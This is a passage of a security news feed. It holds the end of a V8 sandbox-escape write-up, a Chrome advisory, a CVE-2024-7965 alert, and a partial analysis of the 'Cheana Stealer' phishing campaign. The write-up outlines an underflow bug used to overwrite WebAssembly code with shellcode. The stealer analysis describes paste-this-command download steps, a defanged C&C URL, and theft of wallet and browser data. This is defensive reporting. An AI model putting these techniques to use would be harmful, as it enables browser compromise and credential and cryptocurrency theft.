<p>The primitives described above allow for freely manipulating and faking most JavaScript objects. However, all of this happens inside the limited memory space of the V8 sandbox. “Trusted” objects such as WebAssembly instance data cannot yet be manipulated. We will now turn our attention to a bug that can be used to escape the memory sandbox.</p>
<p>An often-used object for JavaScript engine exploits is <code>ArrayBuffer</code> and its corresponding views, (i.e. typed arrays), as it allows for direct, untagged access to some region of memory. </p>
<p>To prevent access to pointers outside the V8 sandbox, sandboxed pointers are used to designate a typed array’s corresponding backing store. Similarly, an ArrayBuffer’s length field is always loaded as a “bounded size access”, inherently limiting its value to a maximum of 235 − 1. </p>
<p>However, in modern JavaScript, the handling of typed arrays has become quite complex due to the introduction of resizable ArrayBuffers (RABs) and their sharable variant, growable SharedArrayBuffers (GSABs). Both variants feature the ability to change their length after the object has been created with the shared variant being restricted to never shrink. In particular, for typed arrays with these kinds of buffers, the array length can never be cached and must be recomputed on each access.</p>
<p>Additionally, ArrayBuffers also feature an offset field, describing the start of the data in the 
actual underlying backing store. This offset must be taken into account when computing the length. </p>
<p>Let’s now look at the code responsible for building a TypedArray’s length access in the optimizing Turbofan compiler. It can be found in <code>v8/src/compiler/graph-assembler.cc</code>. Note that most non-RAB/GSAB cases and the code responsible for dispatching are omitted for simplicity: </p>

<p>For arrays backed by a resizable ArrayBuffer, we can see at (1) that the length is computed as <code>floor((byte_length - byte_offset) / element_size)</code>. Crucially, there is an underflow check. If <code>byte_offset</code> exceeds <code>byte_length</code>, then 0 is returned instead. </p>
<p>Curiously though, in the case of a GSAB-backed array, the corresponding underflow check is missing. Thus, if <code>byte_offset</code> is larger than <code>byte_length</code>, an underflow occurs and the subtraction wraps around to something close to the maximum unsigned 64-bit integer 264. As both of these fields are found in the (by now) attacker-controlled array object, we can easily trigger this using the sandboxed arbitrary read/write primitives discussed previously. This results in access to the whole 64-bit address space, as the length computed by this function is used to bound any typed array accesses (in JIT-compiled code). </p>
<p><b>Exploitation for Arbitrary Shellcode Execution</b></p>
<p>Using the two bugs described above, exploitation becomes fairly straightforward. The primitives described in the Universal WebAssembly Type Confusion section directly give arbitrary reads and writes within the V8 memory sandbox. This can then be used to manipulate a growable <code>SharedArrayBuffer</code> to have an offset greater than its length. A previously JIT-compiled read/write function can then be used to access and overwrite data anywhere in the process’s address space. An appropriate target for overwrite is the compiled code of a <code>WebAssembly</code> module, since that resides in an RWX (read-write-execute) page and can be overwritten with shellcode.</p>

<hr />


  <p class=""><em>Thanks again to Manfred for providing this thorough write-up. He has contributed multiple bugs to the ZDI program over the last few years, and we certainly hope to see more submissions from him in the future. Until then, follow the team on </em><a href="https://www.twitter.com/thezdi"><em>Twitter</em></a><em>, </em><a href="https://infosec.exchange/@thezdi"><em>Mastodon</em></a><em>, </em><a href="https://www.linkedin.com/company/zerodayinitiative"><em>LinkedIn</em></a><em>, or </em><a href="https://www.instagram.com/thezdi"><em>Instagram</em></a><em> for the latest in exploit techniques and security patches.</em></p>
]]></content:encoded>
<pubDate>Thu, 02 May 2024 16:14:11 +0000</pubDate>
</item>
<item>
<title>ZDI-24-1041: Google Chrome Updater DosDevices Local Privilege Escalation Vulnerability</title>
<link>http://www.zerodayinitiative.com/advisories/ZDI-24-1041/</link>
<guid>http://www.zerodayinitiative.com/advisories/ZDI-24-1041/</guid>
<content:encoded><![CDATA[
This vulnerability allows local attackers to escalate privileges on affected installations of Google Chrome. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability. The ZDI has assigned a CVSS rating of 7.8. The following CVEs are assigned: CVE-2023-7261.
]]></content:encoded>
<pubDate>Thu, 01 Aug 2024 00:00:00 -0500</pubDate>
</item>
<item>
<title>High-Risk CVE-2024-7965 Vulnerability in Chrome’s V8 Engine Requires Quick Fix</title>
<link>https://cyble.com/blog/high-risk-cve-2024-7965-vulnerability-in-chromes-v8-engine-requires-quick-fix/</link>
<guid>https://cyble.com/blog/high-risk-cve-2024-7965-vulnerability-in-chromes-v8-engine-requires-quick-fix/</guid>
<content:encoded><![CDATA[
<p><img alt="Cyble-blogs-CVE-2024-7965-Vulnerability" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/08/Cyble-blogs-CVE-2024-7965-Vulnerability.jpg" tabindex="0" width="1200" /></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><a></a>Key Takeaways</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>CISA has included a type of confusion vulnerability affecting Google Chrome and potentially other Chromium-based browsers in its Known Exploited Vulnerabilities (KEV) catalog, highlighting its seriousness and potential for exploitation.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>CVE-2024-7965 affects Chrome's V8 JavaScript engine, allowing attackers to exploit heap corruption through specially crafted HTML pages. Its high CVSS score of 8.8 indicates a severe threat to system confidentiality and integrity.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Google has acknowledged that CVE-2024-7965 is actively being exploited. A critical patch has been released in Chrome versions 128.0.6613.84 for Linux and 128.0.6613.84/.85 for Windows and Mac.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Due to the active exploitation of this vulnerability, it is crucial for all users to update their browsers immediately to the latest version to protect against potential data breaches and security risks.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The latest <a href="https://cyble.com/blog/tag/google-chrome/">Chrome update</a> not only addresses xf but also includes 38 security fixes for other issues, several of which were identified by external researchers.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><a></a>Overview</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CISA has recently added a type of confusion vulnerability to its Known Exploited Vulnerabilities (KEV) catalog. This flaw affects the popular Google Chrome browser and potentially other Chromium-based browsers. It poses a serious risk and has been rated as high due to its potential for exploitation.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Type confusion vulnerabilities, like the one found in Google Chrome's V8 engine, can allow remote attackers to cause heap corruption through specially crafted HTML pages. This issue isn't limited to Google Chrome; it could also impact other Chromium-based browsers, such as Microsoft Edge, Opera, and more.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Google is aware that this <a href="https://cyble.com/solutions/vulnerability-management/">vulnerability</a> is being actively exploited in the wild. In response, they have recently addressed a critical zero-day vulnerability, CVE-2024-7965, which affects versions of Chrome earlier than 128.0.6613.84.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><a></a>Technical Details of CVE-2024-7965</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CVE-2024-7965 affects the V8 JavaScript engine used in Google Chrome. This <a href="https://cyble.com/knowledge-hub/zero-day-exploit/">zero-day vulnerability</a> stems from a flawed implementation that allows attackers to exploit heap corruption through specially crafted HTML pages. With a CVSS score of 8.8, it poses a serious threat to the confidentiality and integrity of affected systems.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>First discovered by the security researcher known as “TheDog” on July 30, 2024, this flaw has prompted Google to issue a critical update. The patch is available in Chrome version 128.0.6613.84 for Linux and 128.0.6613.84/.85 for Windows and Mac.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Given that CVE-2024-7965 is actively being exploited, users must apply this update immediately. Google has been proactive in addressing such threats, as demonstrated by their previous work on CVE-2024-7971, another critical flaw in the V8 engine.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Exploitation of CVE-2024-7965 requires user interaction, such as visiting a compromised webpage, which could lead to unauthorized access or execution of malicious code. Therefore, both organizations and individual users are strongly urged to update their browsers to safeguard against potential data breaches and other <a href="https://cyble.com/knowledge-hub/cybersecurity/">cybersecurity</a> risks.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This vulnerability is part of a larger set of security issues addressed in the latest Chrome update, which includes 38 security fixes, several of which were reported by external researchers.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><a></a>Conclusion</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The CVE-2024-7965 vulnerability represents a significant security risk for Google Chrome and other Chromium-based browsers. With a high CVSS score of 8.8, this type of confusion flaw in the V8 JavaScript engine can lead to severe consequences if exploited. Given that this vulnerability is actively being targeted, users must promptly update their browsers to the latest version. Google’s recent update addresses this critical issue along with 37 other security fixes, highlighting the importance of staying current with software updates to protect against potential threats.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><a></a>Our Recommendations</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Please ensure that all instances of Google Chrome are promptly updated to the most recent version available. The latest updates include crucial security fixes intended to address this vulnerability.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Activate automatic updates in Chrome to receive timely patches and security updates without manual intervention.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Set up comprehensive monitoring and logging solutions to identify and examine suspicious activities.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Develop a thorough patch management strategy that encompasses inventory management, patch assessment, testing, deployment, and verification.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Enforce proper network segmentation to prevent exposure of critical assets over the internet.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Keep an updated inventory of all internal and external assets, comprising hardware, software, and network components.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p>The post <a href="https://cyble.com/blog/high-risk-cve-2024-7965-vulnerability-in-chromes-v8-engine-requires-quick-fix/" rel="nofollow">High-Risk CVE-2024-7965 Vulnerability in Chrome’s V8 Engine Requires Quick Fix</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Tue, 27 Aug 2024 14:28:01 +0000</pubDate>
</item>
<item>
<title>New Cheana Stealer Targets VPN Users Across Multiple Operating Systems</title>
<link>https://cyble.com/blog/new-cheana-stealer-targets-vpn-user/</link>
<guid>https://cyble.com/blog/new-cheana-stealer-targets-vpn-user/</guid>
<content:encoded><![CDATA[
<p><img alt="2" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/08/2.webp" tabindex="0" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key takeaways&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Cyble Research and Intelligence Lab (CRIL) has identified a <a href="https://cyble.com/knowledge-hub/what-is-phishing/">phishing</a> site impersonating a VPN provider. The site specifically targets individuals downloading Virtual Private Network (VPN) applications for Windows, Linux, and macOS. </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The Threat Actor (TA) has created distinct binaries for each platform—Windows, Linux, and macOS—targeting users across these systems.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The Windows version of the stealer targets cryptocurrency-related browser extensions, standalone crypto wallets, and stored browser passwords.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The Linux Version of the stealer Focuses on cryptocurrency browser extensions, standalone crypto wallets, browser login data, cookies, and SSH keys.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>In addition to cryptocurrency browser extensions and crypto wallets, MacOS version steals browser login data, cookies, SSH keys, MacOS passwords, and Keychain.&nbsp;&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The campaign is linked to a Telegram channel with over 54,000 subscribers, active since 2018, and believed to have undergone a change in operators in 2021.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The phishing site has undergone multiple registrar changes, with the most recent switch occurring on August 21, 2024.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Initially, the <a href="https://cyble.com/knowledge-hub/cyber-threat-actor-and-types/">Threat Actors</a> (TAs) appeared to provide legitimate VPN services, gradually gaining user trust. They later shifted to distributing stealer, exploiting the trust they had built. </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Threat actors (TAs) predominantly rely on phishing websites as a method to distribute malware. A key tactic involves impersonating well-known brands, especially those associated with essential or security-related applications, to enhance the credibility of their campaigns. They create a false sense of legitimacy by showcasing compatibility with various platforms and mimicking trusted applications. This deceptive approach exploits users' trust in familiar brands, making it easier for TAs to trick unsuspecting individuals into downloading malicious software. The sophisticated blend of brand impersonation and the appearance of security further reinforces the illusion of authenticity, increasing the chances of successful infiltration.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Recently, CRIL has identified a phishing website aimed at individuals downloading VPN applications for Windows, Linux, and macOS. The TA has created separate stealer binaries for each operating system, using a deceptive site that mimics the legitimate "WarpVPN" service. This phishing site offers detailed installation instructions specific to each platform. Once installed, the stealer extracts various sensitive data from the victim’s machine. It targets cryptocurrency-related browser extensions, standalone crypto wallets, stored browser passwords, browser login data, cookies, SSH keys, macOS passwords, and Keychain. The below image shows the phishing website.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56932,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Phishing site " class="wp-image-56932" src="https://cyble.com/wp-content/uploads/2024/08/Figure-1-Phishing-site.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>1</em><em> - Phishing site</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>We have named this stealer "Cheana Stealer," based on the C&amp;C server name "ganache.live" and TA's frequent use of the string "ganache" in the stealer’s code.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Spreading Mechanism&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>During our investigation, we discovered a Telegram channel linked to this campaign. The phishing website associated with the campaign is referenced in the channel's bio. This channel has over 54,000 subscribers and plays a crucial role in the distribution of malicious content. The figure below displays the Telegram channel.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56933,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Telegram Channel " class="wp-image-56933" src="https://cyble.com/wp-content/uploads/2024/08/Figure-2-Telegram-Channel.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>2</em><em> - Telegram Channel</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Upon further investigation, we found that this channel has been active since at least 2018, with several profile changes over time, as shown in the figure below. Notably, the phishing site was added to its bio in 2021.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56934,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Telegram Profile Changes " class="wp-image-56934" src="https://cyble.com/wp-content/uploads/2024/08/Figure-3-Telegram-Profile-Changes.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>3</em><em> - Telegram Profile Changes</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The phishing site has switched registrars’ multiple times, with the most recent change occurring on August 21, 2024. We suspect that the TAs initially provided legitimate services and are now taking advantage of the trust they've built to distribute stealer <a href="https://cyble.com/knowledge-hub/what-is-malware/">malware</a>. Posts from 2021 indicate that the TAs offered free VPN services individually, as illustrated in the figure below, further supporting this claim. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56936,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Warpvpn Site in 2021 " class="wp-image-56936" src="https://cyble.com/wp-content/uploads/2024/08/Figure-4-Warpvpn-Site-in-2021.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>4</em><em> - Warpvpn Site in 2021</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The figure below shows the post made in 2021.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56937,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Telegram post made in 2021 " class="wp-image-56937" src="https://cyble.com/wp-content/uploads/2024/08/Figure-5-Telegram-post-made-in-2021.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>5</em><em> - Telegram post made in 2021</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>We also observed that a Russian native speaker likely wrote posts made before 2021, while posts from 2021 appear to be auto-translated versions, as shown in the figure below. Interestingly, the phishing domain was also added to the channel's bio in 2021, suggesting that the operator of the Telegram channel may have changed during that time.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56938,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Comparison between 2019 &amp; 2021 posts " class="wp-image-56938" src="https://cyble.com/wp-content/uploads/2024/08/Figure-6-Comparison-between-2019-2021-posts.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>6</em><em> - Comparison between 2019 &amp; 2021 posts</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Additionally, in 2021, the channel's profile photo was updated to an image taken by a Russian YouTuber, as shown in the figure below. Moreover, upon investigating the contact person mentioned in the channel, we discovered that they have a history of frequent interactions with Arabic speakers. This further suggests that the channel's operator might be from a different origin, attempting to pose as a Russian individual.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56939,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Telegram Channel Icon " class="wp-image-56939" src="https://cyble.com/wp-content/uploads/2024/08/Figure-7-Telegram-Channel-Icon.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>7</em><em> - Telegram Channel Icon</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Technical Analysis&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>In this campaign, the TAs set up a phishing site that impersonates a legitimate VPN service, offering detailed installation instructions for Windows, Linux, and macOS.&nbsp; The initial infection occurs when users follow the phishing site’s instructions, which involve copying and pasting platform-specific commands into their systems. Each set of commands—tailored for Windows, macOS, and Linux—ensures the malicious code is executed correctly on the respective operating system.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>In this section, we will examine how TA steals sensitive information across different platforms, focusing on both common techniques and platform-specific approaches.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">Windows&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>For Windows, the TA utilizes PowerShell commands to carry out the attack. They use ‘<em>Invoke-WebRequest</em>’ to download the “<em>install.bat</em>” file from "hxxps://warpvpn[.]net". Following the download, ‘<em>Start-Process</em>’ command is used to launch a new instance of ‘<em>cmd.exe’</em>, passing ‘<em>install.bat</em>’ as an argument to execute the batch file. This method ensures the ‘install.bat’ script is run seamlessly as part of the attack. As shown in the image below, the TA instructs users to copy and paste commands intended for PowerShell into the Command Prompt. These commands will not work properly in the Command Prompt and will only execute correctly within a PowerShell environment.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56940,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="installation instructions for windows " class="wp-image-56940" src="https://cyble.com/wp-content/uploads/2024/08/Figure-8-–-installation-instruction-for-windows.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>8</em><em> – installation instructions for windows</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The <em>“install.bat”</em> script performs the following things:&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Verify if Python is installed silently using the command “<em>python --version &gt;nul 2&gt;&amp;1</em>”. If Python is not installed, download and extract the “<em>python-3.11.3-embed-amd64.zip</em>” from python.org.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Check if “<em>pip</em>” is installed. If not, download and install it using the ‘get-pip.py’ script from “<em>https://bootstrap.pypa.io/get-pip.py</em>”&nbsp;&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Determine if “<em>virtualenv”</em> is installed. If missing, install “<em>virtualenv” </em>using<em> </em>pip.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Create a virtual environment and activate it using “<em>call venv\Scripts\activate”</em>.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Download and install the “<em>hclockify-win</em>” package from “<em>hxxps://ganache.live/media/attachments/hclockify-win.zip</em>”, which masquerades as a legitimate Python “<em>clockify</em>” module&nbsp;&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Use “<em>pip</em>” to install all necessary dependencies for “<em>hclockify-win</em>”.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Run the “<em>main.py</em>” script from the “<em>hclockify-win</em>” package.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Use a “<em>goto</em>” statement to invoke a lure function that installs the legitimate Cloudflare application, thereby disguising the malicious intent.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>The below figure shows the content of the <em>install.bat.</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56942,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Content of Install.bat " class="wp-image-56942" src="https://cyble.com/wp-content/uploads/2024/08/Figure-9-–-Content-of-Install.bat_.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>9</em><em> – Content of Install.bat</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The malicious python package “<em>hclockify-win</em>” contains scripts to orchestrate sensitive information collection and exfiltration by calling various modules. These modules target cryptocurrency browser extensions, Crypto Wallets, and Stored Browser passwords.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Targeting Browser Extensions</strong>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The Python package "<em>hclockify-win</em>" includes a module named "<em>ganache.helperwd</em>" that scans multiple Chromium-based browsers, including Chrome, Brave, Opera, and Microsoft Edge, for cryptocurrency wallet extensions such as Trust Wallet, TronLink, Coinbase, Exodus, Crypto.com, Nami, and Solana. Once these extensions are detected, the module compresses their folders into a zip file and sends the data to the TAs command and control (C&amp;C) server through a POST request, as illustrated in the figure below.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56943,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Targets Browser Extension " class="wp-image-56943" src="https://cyble.com/wp-content/uploads/2024/08/Figure-10-–-Targets-Browser-Extension.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>10</em><em> - Targets Browser Extension</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>By targeting these extensions, the TAs aim to steal cryptocurrency wallet data, including private keys, recovery phrases, and transaction details. This could potentially allow the TAs to gain unauthorized access to the victim's digital assets. The stolen information can be further exploited or sold on cybercrime forums.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>After scanning multiple browsers for cryptocurrency wallet extensions, the module proceeds to search through all Firefox profiles. It targets the <em>prefs.js</em> file to identify the unique ID linked to MetaMask by searching for <em>webextension@metamask.io</em>. Once the unique ID is identified, the module uses it to locate MetaMask’s backend data file present in the location “<em>b0kwoimz.default-release\storage\default\moz-extension+++7f784e52-eabb-4316-8e36-850ac47f0760^userContextId=4294967295”.</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The script then compresses this data into a zip file and transmits it to the TAs server via a POST request, maintaining the continuity of the data exfiltration process.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56944,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Targets Firefox's MetaMask extension " class="wp-image-56944" src="https://cyble.com/wp-content/uploads/2024/08/Figure-11-–-Targets-Firefoxs-MetaMask-extension.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>11</em><em> – Targets Firefox's MetaMask extension</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Targeting Crypto Wallets</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>The malicious Python module then searches for cryptocurrency wallets installed on the system, identifying the installation directories for well-known crypto wallets such as Bitcoin, Monero, and Dashcore. After locating these directories, the content of these wallets is compressed into a zip file and subsequently uploaded to the TAs command and control (C&amp;C) server through a POST request, as shown in the figure below.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56946,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Targets Crypto Wallets   " class="wp-image-56946" src="https://cyble.com/wp-content/uploads/2024/08/Figure-12-–-Targets-Crypto-Wallets.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>12</em><em> – Targets Crypto Wallets&nbsp;&nbsp;</em>&nbsp;</p>
